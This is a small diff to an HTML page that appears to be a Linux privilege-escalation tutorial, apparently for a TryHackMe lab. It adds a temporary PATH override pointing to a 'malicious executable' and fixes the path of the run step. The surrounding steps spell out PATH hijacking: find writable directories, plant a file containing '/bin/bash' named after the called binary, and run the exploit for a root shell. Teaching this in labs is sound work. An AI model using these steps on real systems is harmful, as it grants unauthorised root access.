@@ -126,11 +126,13 @@ void main(){
                         <pre><code class="language-bash">find / -writable 2>/dev/null</code></pre>
                         <h4> 4.1. In case you can't find a directory which is un  $PATH variable you can add your own with the following command</h4>
                         <pre><code class="language-bash">export PATH=/tmp:$PATH</code></pre>
+                        <p>In case you dont want to make it permanent</p>
+                        <pre><code class="language-bash">PATH=/path/where/you/maliciousexecutable/is:$PATH</code></pre>
                         <h4> 5. Create the exploit to become root, must be with the same name as the C script </h4>
                         <pre><code class="language-bash">echo "/bin/bash" > thm</code></pre>
                         <pre><code class="language-bash">chmod 777 thm</code></pre>
                         <h4> 6. Run the script </h4>
-                        <pre><code class="language-bash">/exploit</code></pre>
+                        <pre><code class="language-bash">./exploit</code></pre>
                     </ul> 
                 </div>
 
